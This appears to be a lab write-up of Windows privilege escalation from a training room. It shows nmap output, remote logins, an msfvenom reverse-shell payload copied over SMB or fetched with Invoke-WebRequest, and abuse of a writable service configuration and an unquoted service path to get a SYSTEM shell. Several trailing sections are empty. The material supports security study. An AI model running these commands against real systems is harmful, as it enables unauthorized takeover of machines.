# Windows PrivEsc

<img width="1907" height="364" alt="image" src="https://github.com/user-attachments/assets/82f1df6e-1dca-4555-bfea-af1faf6f0869" />


>[!note]
> ### Connect to Target using `RDP srvice enabled`:
>
> ```ruby
> xfreerdp3 /u:user /p:password321 /cert:ignore /v:10.10.103.25
> ```
> Or
> ```ruby
> rdesktop 10.10.103.25 -u user -p password321
> ```
> #### `if winrm service is enabled` :
> ```ruby
> evil-winrm -i 10.10.103.25 -u user -p 'password321'
> ```
> #### `if SMB service is enabled` :
> ```ruby
> smbclient //MACHINE_IP/C$ -U user
> ```

- <details>
     <summary>Nmap Scan</summary>

  ```ruby
  nmap -sC -sV  10.10.103.25 
  ```
  
  **`output`**
  
  ```ruby
  PORT     STATE SERVICE       VERSION
  135/tcp  open  msrpc         Microsoft Windows RPC
  139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp  open  microsoft-ds  Windows Server 2019 Standard Evaluation 17763 microsoft-ds
  3389/tcp open  ms-wbt-server Microsoft Terminal Services
  |_ssl-date: 2025-09-08T19:27:18+00:00; -2s from scanner time.
  | ssl-cert: Subject: commonName=WIN-QBA94KB3IOF
  | Not valid before: 2025-09-07T18:56:41
  |_Not valid after:  2026-03-09T18:56:41
  | rdp-ntlm-info: 
  |   Target_Name: WIN-QBA94KB3IOF
  |   NetBIOS_Domain_Name: WIN-QBA94KB3IOF
  |   NetBIOS_Computer_Name: WIN-QBA94KB3IOF
  |   DNS_Domain_Name: WIN-QBA94KB3IOF
  |   DNS_Computer_Name: WIN-QBA94KB3IOF
  |   Product_Version: 10.0.17763
  |_  System_Time: 2025-09-08T19:27:08+00:00
  5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-title: Not Found
  |_http-server-header: Microsoft-HTTPAPI/2.0
  Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
  
  Host script results:
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  |_clock-skew: mean: 1h23m59s, deviation: 3h07m51s, median: -1s
  | smb-os-discovery: 
  |   OS: Windows Server 2019 Standard Evaluation 17763 (Windows Server 2019 Standard Evaluation 6.3)
  |   Computer name: WIN-QBA94KB3IOF
  |   NetBIOS computer name: WIN-QBA94KB3IOF\x00
  |   Workgroup: WORKGROUP\x00
  |_  System time: 2025-09-08T12:27:11-07:00
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  | smb2-time: 
  |   date: 2025-09-08T19:27:12
  |_  start_date: N/A
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 256.26 seconds
  ```
  
  - **`3389/tcp open  ms-wbt-server`** : That is mean `RDP service` is work
  - **`5985/tcp open  http`** : That is mean `WinRM HTTP service` is work
  - **`445/tcp  open  microsoft-ds`** : That is mean `SMB service` is work


     
  </details>



<details>
  <summary>Generate a Reverse Shell Executable</summary>

## 1. first Create **`Reverse Shell file`** on my kali device

```ruby
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

- **`msfvenom`** : Tool to create payload
- **`-p windows/x64/shell_reverse_tcp`** : Reverse shell type
- **`LHOST`** : Device IP that will recive the shell in this case will be my kali machine
- **`LPORT`** : port that shell will connect to it on kali
- **`-f exe`** : output file type `exe`
- **`-o reverse.exe`** : put the output in file call ``reverse.exe``

## 2. send reverse sell to windows

**`on kali Device open smb servrice on directory that have reverseshell file`**

```ruby
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

- **`kali`** : name share
- **`.`** : files that will avilable in the share here in current folder

**`on Windows Device`**

```ruby
copy \\10.8.47.102\kali\reverse.exe C:\PrivEsc\reverse.exe
```

- copy file from kali machine to windows


---

<img width="638" height="147" alt="image" src="https://github.com/user-attachments/assets/0fb8c918-0b43-445d-81ce-ba68f457888f" />


<img width="1441" height="449" alt="image" src="https://github.com/user-attachments/assets/dce924e7-a87f-4dff-af42-349654bc9647" />

- **`that is mean file is copied to windows`**

---

### **`now run the reverse file on windows with lesten on port 4444 on kali`**

<img width="715" height="307" alt="image" src="https://github.com/user-attachments/assets/6c150d81-145e-4b5f-b16d-8985d3ffaf89" />

- **`here we go we receved the shell `**


  
</details>









<details>
  <summary>Service Exploits</summary>




- <details>
      <summary>🟦Understanding</summary>

  
  ## ``1. know all services that work on system and it's privileges``
  
  # **`CMD`**
  
  ```ruby
  sc query type= service state= all
  ```
  
  # **`PowerShell`**
  
  ```ruby
  Get-Service | Select-Object Name, Status, StartType
  ```
  
  
  ---
  ---
  
  ## ``2. know the privilges of the user on each service``
  
  ```ruby
  accesschk.exe -uwcqv user *
  ```
  
  > you must download **`accesschk.exe`**
  > 

  https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

  <details>
    <summary>send it to vectem</summary>
  
  ## **`using SMB`**
  
  **`on kali`**
  
  ```ruby
  sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
  
  ```
  
  **`on windows`**
  
  ```ruby
  copy \\10.10.10.10\kali\accesschk.exe C:\PrivEsc\accesschk.exe
  ```
  
  ----
  ----
  
  ## **`using Powershell`**
  
  **`on windows`** if device connected to internet
  
  ```ruby
  Invoke-WebRequest -Uri "http://10.10.10.10/accesschk.exe" -OutFile "C:\PrivEsc\accesschk.exe"
  ```
  
  **`on kali`**
  
  ```ruby
  python3 -m http.server 80
  ```
  
  
    
  </details>


  > by default it downloaded on this machine 





  ---
  ---
  
  ## 3. found the services that work as **`SYSTEM`**
  
  # **`CMD`**
  
  ```ruby
  sc qc <ServiceName>
  ```
  
  > - look at **`SERVICE_START_NAME`** value
  
  # **`PowerShell`**
  
  ```ruby
  Get-WmiObject Win32_Service | Select-Object Name, StartName
  ```


  </details>








- <details>
      <summary>Insecure Service Permissions</summary>

  
  > ### Goal is prevEsc form normal user to `SYSTEM privileges` by **`daclsvc`** service 
  
  ## 1. first check the pricvllage of current user on this service ``(daclsvc)``
  
  ```ruby
  C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
  ```
  
  - **`accesschk.exe`** : This is Tool form _Sysinternals_ to check on privilege of current user on (files, folders, etc...)
  - **`/accepteula`** : this option to pybaass the first priv window
  - **`-uwcqv`** : options
    - **`u`** : user account
    - **`w`** : writeing privileges
    - **`c`** : change `config` privileges
    - **`q`** : `quiet` to make it simple
    - **`v`** : `verbose` for more details
  - **`user`** : username of current user
  - **`daclsvc`** : service name
      
  
  ---
  
  <img width="584" height="296" alt="image" src="https://github.com/user-attachments/assets/c8ab3ba2-ad0a-4c86-99e3-ace3b7ce30fb" />
  
  ### - **`Found that user have`** :
  
  ```ruby
  SERVICE_CHANGE_CONFIG
  ```
  ### - ``Thats mean this user can change settings of this service``
  
  
  ---
  
  ## 2. now we want to know privileges of the current service
  
  ```ruby
  sc qc daclsvc
  ```
  
  - **`sc qc`** : query config for service
  - **`daclsvc`** : name of the service
  
  ---
  
  <img width="860" height="319" alt="image" src="https://github.com/user-attachments/assets/abec5e68-4f0c-439c-933e-79bc3f289979" />
  
  ### - we found :
  
  - **`SERVICE_START_NAME`** : the account that this service work with it
  - **`LocalSystem`** : that is mean if we run this service any program will run as **`SYSTEM`**
  
  
  
  ---
  
  > ### NOW WE know that :
  > - this service can work as **`SYSTEM`**
  > - current user can edit this service settings **`SERVICE_CHANGE_CONFIG`**
  
  
  ## 3. change the path of this service to path of our reverse shell that will send shell to kali with **`SYSTEM`** privileges : 
  
  ```ruby
  sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
  ```
  
  - **`sc config`** : change service settings
  - **`binpath=`** : the new path to that service will run it
  - **`\"C:\PrivEsc\reverse.exe\`** : reverse shell that we sent it before
  
  
  ### **`lesten on port 4444 on kali`**
  
  ### **`run the service`**
  
  <img width="677" height="212" alt="image" src="https://github.com/user-attachments/assets/ad7a133f-2592-45ba-9083-47dfb2ed716b" />
  
  ---
  
  ## receved the shell :
  
  <img width="719" height="210" alt="image" src="https://github.com/user-attachments/assets/7d36208c-ce01-4047-9eaf-04c855830e50" />
  
  ---
  
  ## see that we now **`SYSTEM`** user
  
  ```ruby
  whoami
  ```
  
  <img width="327" height="79" alt="image" src="https://github.com/user-attachments/assets/64e23bed-3b42-4219-8714-a256a4f0db96" />
  
  <details>
    <summary>more commands</summary>
  
  
  ## to see our privilleges
  
  ```ruby
  whoami /priv
  ```
  <img width="1282" height="624" alt="image" src="https://github.com/user-attachments/assets/a65ceb03-b5b5-4c09-a2fc-a2214f0ef8fc" />
  
  
  ## see the groups that i'm in : 
  
  ```ruby
  whoami /groups
  ```
  
  <img width="1158" height="249" alt="image" src="https://github.com/user-attachments/assets/c2689996-2809-4a2d-bec0-9508e3c0a142" />
  
  ```ruby
  systeminfo
  ```
  
  <img width="796" height="599" alt="image" src="https://github.com/user-attachments/assets/1ec7bb31-9838-41fd-8872-ffe6e0b1d56c" />
  
  ## to show all env variables: 
  
  ```ruby
  set
  ```
  
  <img width="1403" height="554" alt="image" src="https://github.com/user-attachments/assets/5a9fa26d-e836-4fe0-9ada-2372d7e46a96" />
  
  
    
  </details>
  
  
  > ## now the answer of the question :
  > What is the original BINARY_PATH_NAME of the daclsvc service?
  
  ```ruby
  sc qc daclsvc
  ```
  
  <img width="860" height="319" alt="image" src="https://github.com/user-attachments/assets/abec5e68-4f0c-439c-933e-79bc3f289979" />
  
  **`answer`**
  
  ```ruby
  C:\Program Files\DACL Service\daclservice.exe
  ```
  


  </details>













- <details>
      <summary>Unquoted Service Path</summary>

     
     
     > ## in windows each service has :
     > - **`BINARY_PATH_NAME`** : THE path with refer to the place that have **`exe`** that this service will run it
     >   - if it's value writen without ``"..."`` that mean we can exploit it
     
     
     ---
     
     ## 1. first get info about the service (unquotedsvc)
     
     ```ruby
     sc qc unquotedsvc
     ```
     
     ## - found two important things
     
     > - **`SERVICE_START_NAME : LocalSystem`** : that is mean this service work as **`SYSTEM`**
     > - **`BINARY_PATH_NAME        : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`**
     >>  - IT without ``"..."``
     
     
     <img width="883" height="262" alt="image" src="https://github.com/user-attachments/assets/888cae7d-e707-4a32-bf40-02b668d079b5" />
     
     ---
     
     ## 2. TRY To know the privilege of current user on this path
     
     ```ruby
     C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
     ```
     
     ## - **`RW BUILTIN\Users`** : that is mean any normal user can do read and write in this folder
     
     
     <img width="823" height="173" alt="image" src="https://github.com/user-attachments/assets/418384ed-aeff-4838-91b8-966a9933ba4d" />
     
     
     ---
     
     ## 3. move the reverse shell to the new path with new name 
     
     
     ```ruby
     copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
     ```
     
     <img width="778" height="82" alt="image" src="https://github.com/user-attachments/assets/28249e57-c476-4664-b89f-7b136ef20544" />
     
     
     
     ## 4. open listener on kali
     
     ```ruby
     sudo nc -nvlp 4444
     ```
     
     ## 5. run the service 
     
     ```ruby
     net start unquotedsvc
     ```
     
     <img width="963" height="412" alt="image" src="https://github.com/user-attachments/assets/5b8eaba2-2421-4e4d-9d67-96e604910b74" />
     
     ---
     
     <img width="1646" height="214" alt="image" src="https://github.com/user-attachments/assets/c25163f8-d4d4-4446-94b9-6398e62bcc7d" />
     



  </details>















- <details>
      <summary></summary>
  </details>


- <details>
      <summary></summary>
  </details>
  



  
</details>












<details>
  <summary></summary>
</details>

<details>
  <summary></summary>
</details>

<details>
  <summary></summary>
</details>

<details>
  <summary></summary>
</details>

<details>
  <summary></summary>
</details>

<details>
  <summary></summary>
</details>

<details>
  <summary></summary>
</details>





